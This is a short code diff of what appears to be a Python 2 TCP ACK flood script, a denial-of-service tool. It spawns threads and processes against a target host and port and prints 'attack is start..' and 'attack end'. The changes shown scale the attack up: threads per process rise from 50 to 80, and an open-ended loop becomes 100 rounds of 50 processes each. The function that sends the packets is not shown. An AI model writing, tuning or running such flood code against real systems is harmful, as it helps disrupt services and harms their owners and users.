@@ -22,7 +22,7 @@ def tcp_ack(h,p):
 
 def mutil_threading():
     job = []
-    for i in range(50):
+    for i in range(80):
         t = threading.Thread(target=tcp_ack,args=(host,port))
         job.append(t)
         t.start()
@@ -35,8 +35,9 @@ def multi_process(count):
         p.start()
 
 if __name__ == "__main__":
+    print 'attack is start..'
     try:
-        while True:
-            multi_process(10)
+        for i in range(100):
+            multi_process(50)
     except KeyboardInterrupt:
         print "attack end"
